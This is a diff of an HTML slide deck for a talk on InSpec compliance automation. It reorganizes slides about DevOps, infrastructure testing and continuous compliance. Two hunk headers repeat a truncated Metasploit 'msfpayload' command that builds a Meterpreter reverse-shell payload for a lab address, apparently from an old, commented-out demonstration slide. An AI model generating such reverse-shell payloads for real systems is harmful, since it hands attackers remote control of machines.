@@ -42,6 +42,10 @@
         width: 49%;
         display: inline-block;
       }
+
+      a {
+        cursor: pointer;
+      }
     </style>
   </head>
 
@@ -68,6 +72,9 @@
     </script>
 
     <div class="reveal">
+      <!--
+Slide 1: Whatladf
+    -->
 
       <!-- Any section element inside of this container is displayed as a slide -->
       <div class="slides">
@@ -76,6 +83,7 @@
           <h1 class="z blue lightbg">InSpec</h1>
           <h3 class="z blue lightbg">forge compliance into automation</h3>
         </section>
+
 
         <!--
         Tell the personal story of how auditors came into our DevOps cloud
@@ -90,10 +98,11 @@
           <p class="lightbg">anno 2011</p>
         </section> -->
 
-        <!-- <section>
+        <section>
           <h3 style="text-transform: lowercase;">$> whoami</h3>
-          <div class="col50">
+          <div >
             <p>Dominik Richter</p>
+            <p style="font-size: smaller">Co-creator of InSpec and Chef Compliance</p>
             <p style="font-size: smaller">Product Manager at Chef</p>
             <ul class="vertical-list" style="font-size: smaller; text-align:center">
               <li>
@@ -101,47 +110,23 @@
               </li>
             </ul>
           <div>
-        </section> -->
+        </section>
 
-        <!-- <section>
-          <h1>1. Compliance 101</h1>
-        </section> -->
-
-        <!-- <section data-background="morris.worm.jpg">
-          &nbsp;
-          <p style="font-size: small; color: #888">
-            Source: <a src="https://flic.kr/p/gYnnPg">Intel Free Source on flick</a>
-          </p>
+        <section data-background="phone-old-year-built-1955-bakelite-163008.jpeg">
+          <h2 class="z gray lightbg">Background in TelCos</h2>
         </section>
 
         <section>
-          <p>Security vulnerabilities gave rise to IT compliance</p>
-          <ul class=spacelist style="width: 70%">
-            <li >1988 Morris Worm<span class=fragment>, National Bank Chicago 70$mio theft</span></li>
-            <li class=fragment>1994 Citibank 10$mio hack, AOHell</li>
-            <li class=fragment>1996 Brotherhood hacks Canadian Broadcast Corp.</li>
-            <li class=fragment>1998 Free Mitnick Logic Bomb; Security incidents at 75% of organizations</li>
-          </ul>
+          <h3>The Chef universe</h3>
+          <img src="chef.universe.png" alt="The Chef Universe" width="80%">
         </section>
 
         <section>
-          <h2>State of security in YYYY</h2>
-          <ul class=spacelist style="width: 70%">
-            <li >In 60% of cases, attackers can compromise organizations within minutes.</li>
-            <li class=fragment>99.9% of the exploited vulnerabilities were compromised more than a year after the vulnerability was published.</li>
-            <li class=fragment>Ten vulnerabilities account for 97% of the exploits observed.</li>
+          <ul class="block-list">
+            <li><span class="z blue">What is InSpec?</span></li>
+            <li class="fragment"><span class="z gray">Compliance profiles</span></li>
+            <li class="fragment"><span class="z gray">Continuous Compliance</span></li>
           </ul>
-          <small>Verizon Data Breach Report</small>
-        </section> -->
-
-        <section>
-          <h2>State of security in 2014</h2>
-          <ul class=spacelist style="width: 70%">
-            <li>In 60% of cases, attackers can compromise organizations within minutes.</li>
-            <li>99.9% of the exploited vulnerabilities were compromised more than a year after the vulnerability was published.</li>
-            <li>Ten vulnerabilities account for 97% of the exploits observed.</li>
-          </ul>
-          <small>Verizon Data Breach Report</small>
         </section>
 
 				<!--
@@ -172,6 +157,60 @@ msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 X > m
           </pre>
         </section>
         -->
+
+        <section data-background="power.plant.jpg">
+          <h2 class="z orange">DevOps Transformation</h2>
+        </section>
+
+        <section>
+          <h2>The promise of the coded business</h2>
+          <img src="codification.promises.png" alt="Codification promises" style="margin-top: -2rem;"/>
+        </section>
+
+        <section>
+          <h3>Step #1: Codify your tech</h3>
+          <pre>
+            <code class="hljs ruby">
+template '/etc/ssh/sshd_config' do
+  source 'opensshd.conf.erb'
+  mode '0600'
+  owner 'root'
+  group 'root'
+  variables(
+    mac: SshMac.get_macs(node),
+    kex: SshKex.get_kexs(node),
+    cipher: SshCipher.get_ciphers(node),
+    ...
+            </code>
+          </pre>
+        </section>
+
+				<section>
+					<h3>Why infrastructure testing?</h3>
+				</section>
+
+				<section data-background="nuclear.jpeg">
+					<h3 style="background: rgba(255,255,255,0.4);">Code breaks</h3>
+					<p style="background: rgba(0,0,0,0.3); color: white; font-size: smaller;">normal accident theory</p>
+				</section>
+
+				<section data-background="#fff">
+					<img src="dc.complexity.1.png" alt="DC complexity 1" style="box-shadow: none" />
+				</section>
+
+				<section data-background="#fff">
+					<img src="dc.complexity.2.png" alt="DC complexity 2" style="box-shadow: none" />
+				</section>
+
+				<section data-background="#fff">
+					<img src="dc.complexity.3.png" alt="DC complexity 3" style="box-shadow: none" />
+				</section>
+
+				<section>
+					<h3>Why infrastructure testing?</h3>
+					<h3 class="fragment">1. Reduce the number of defects</h3>
+					<h3 class="fragment">2. Security and Compliance testing</h3>
+				</section>
 
         <section>
           <h2>Regulatory compliance</h2>
@@ -221,83 +260,6 @@ msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 X > m
       ================
       -->
 
-      <section>
-        <h2>Creating a new component</h2>
-        <img src="compliance.users.devops.png" alt="DevOps users" style="clip: rect(0px,60px,200px,0px);"/>
-      </section>
-
-        <!-- <section>
-          <h2>Codify system hardening</h2>
-          <pre>
-            <code class="hljs json">
-{
-    "name": "hardening",
-    "description": "Secure our server",
-    "json_class": "Chef::Role",
-    "chef_type": "role",
-    "run_list": [
-        "recipe[os-hardening]",
-        "recipe[ssh-hardening]"
-        ...
-            </code>
-          </pre>
-        </section> -->
-
-        <section>
-          <h2>System configuration in code</h2>
-          <pre>
-            <code class="hljs ruby">
-template '/etc/ssh/sshd_config' do
-  source 'opensshd.conf.erb'
-  mode '0600'
-  owner 'root'
-  group 'root'
-  variables(
-    mac: SshMac.get_macs(node),
-    kex: SshKex.get_kexs(node),
-    cipher: SshCipher.get_ciphers(node),
-    ...
-            </code>
-          </pre>
-        </section>
-
-        <section>
-          <h2>The promise of the coded business</h2>
-          <img src="codification.promises.png" alt="Codification promises" style="margin-top: -2rem;"/>
-        </section>
-
-        <section>
-          <h2>Almost there</h2>
-          <p>Test for assurance across your infrastructure and apps</p>
-        </section>
-
-				<section>
-					<h3>Why infrastructure testing?</h3>
-				</section>
-
-				<section data-background="nuclear.jpeg">
-					<h3 style="background: rgba(255,255,255,0.4);">Code breaks</h3>
-					<p style="background: rgba(0,0,0,0.3); color: white; font-size: smaller;">normal accident theory</p>
-				</section>
-
-				<section data-background="#fff">
-					<img src="dc.complexity.1.png" alt="DC complexity 1" style="box-shadow: none" />
-				</section>
-
-				<section data-background="#fff">
-					<img src="dc.complexity.2.png" alt="DC complexity 2" style="box-shadow: none" />
-				</section>
-
-				<section data-background="#fff">
-					<img src="dc.complexity.3.png" alt="DC complexity 3" style="box-shadow: none" />
-				</section>
-
-				<section>
-					<h3>Why infrastructure testing?</h3>
-					<h3 class="fragment">1. Reduce the number of defects</h3>
-					<h3 class="fragment">2. Security and Compliance testing</h3>
-				</section>
-
         <!--
         Operating at velocity has benefits in addition to agile, scalable compliance.
         The processes, culture and technology used for compliance at velocity also
@@ -313,9 +275,9 @@ template '/etc/ssh/sshd_config' do
           <img src="compliance.users.png" alt="Compliance users"/>
         </section>
 
-        <section data-background="compliance.doc.png">
+        <!-- <section data-background="compliance.doc.png">
           &nbsp;
-        </section>
+        </section> -->
 
         <section>
           <img src="different.languages.png" alt="Different language"/>
@@ -548,6 +510,14 @@ end
 					</code></pre>
 </section>
 
+<section>
+  <ul class="block-list">
+    <li><span class="z gray">What is InSpec?</span></li>
+    <li><span class="z blue">Compliance profiles</span></li>
+    <li><span class="z gray">Continuous Compliance</span></li>
+  </ul>
+</section>
+
         <section>
 					<h1>CIS and SCAP</h1>
 				</section>
@@ -641,7 +611,7 @@ end
   <ul class="vertical-list">
     <li class=fragment>Build foundation for communication</li>
     <li class=fragment>Share knowledge and code</li>
-    <li class=fragment>Codify agreements after audits</li>
+    <li class=fragment>Codify agreements</li>
   </ul>
 </section>
 
@@ -688,7 +658,11 @@ end
         -->
 
         <section>
-          <h1>Continuous compliance</h1>
+          <ul class="block-list">
+            <li><span class="z gray">What is InSpec?</span></li>
+            <li><span class="z gray">Compliance profiles</span></li>
+            <li><span class="z blue">Continuous compliance</span></li>
+          </ul>
         </section>
 
 				<section>
@@ -701,13 +675,13 @@ end
           <img src="old.workflow.png" alt="Development stopped by auditors" />
         </section>
 
-        <section>
+        <!-- <section>
           <img src="compliance.v.velocity.1.png" alt="Compliance v Velocity 1" width="70%" />
         </section>
 
         <section>
           <img src="compliance.v.velocity.4.png" alt="Compliance v Velocity 4" width="90%" />
-        </section>
+        </section> -->
 
         <!-- <section>
           <h2>Competitive Advantage</h2>
@@ -719,36 +693,30 @@ end
           <h2>Continuous workflow</h2>
         </section>
 
-        <section>
+        <!-- <section>
           <img src="compliance.workflow.png" alt="Compliance Workflow"/>
         </section>
 
         <section>
           <h2>Create and test early on</h2>
-        </section>
+        </section> -->
 
-        <section data-background="ssh-profile.png">
+        <!-- <section data-background="ssh-profile.png">
           &nbsp;
-        </section>
+        </section> -->
 
         <section data-background="compliance-kitchen-test.png">
-          &nbsp;
-        </section>
-
-        <section>
-          <h2>Test continuously</h2>
+          <h2 class="z red">Create and test early on</h2>
+          <!-- &nbsp; -->
         </section>
 
         <section data-background="delivery.integration.1.png">
-          &nbsp;
+          <h2 class="z red">Test continuously</h2>
+          <!-- &nbsp; -->
         </section>
 
-        <section>
-          <h2>Deploy, Operate, Verify</h2>
-        </section>
-
-        <section data-background="ui.screenshot.png">
-          &nbsp;
+        <section data-background="automate.compliance.overview.png">
+          <h2 class="z red">Deploy, Operate, Verify</h2>
         </section>
 
         <section>
@@ -757,7 +725,7 @@ end
         </section>
 
         <section>
-          <h2>Safety at Velocity</h2>
+          <h2 class="z blue">Safety at Velocity</h2>
           <ul class="vertical-list">
             <li class=fragment>Risk reduction when constantly changing your systems</li>
             <li class=fragment>As part of the workflow. Not after, not later.</li>
@@ -779,8 +747,22 @@ end
           <h1><a href="https://github.com/chef/inspec" target="_blank">
             <i class="icon-github-circled"></i>
           </a></h1>
-          <h6><a href="https://github.com/chef/inspec" target="_blank">github.com/chef/inspec</a></h6>
           <h6><a href="http://inspec.io" target="_blank">inspec.io</a></h6>
+          <h6><a href="https://github.com/chef/inspec" style="font-size: smaller" target="_blank">github.com/chef/inspec</a></h6>
+        </section>
+
+        <section data-background="intro.jpeg">
+          &nbsp;
+        </section>
+
+        <section>
+          <h2 class="z gray">Where are we going?</h2>
+          <ul class="vertical-list">
+            <li class=fragment>Marrying Chef Compliance and Chef Automate</li>
+            <li class=fragment>Cloud compliance (AWS, Azure, VMware, ...)</li>
+            <li class=fragment>Regulatory Compliance</li>
+            <li class=fragment>InSpec for Habitat and Docker</li>
+          </ul>
         </section>
 
         <!-- <section>
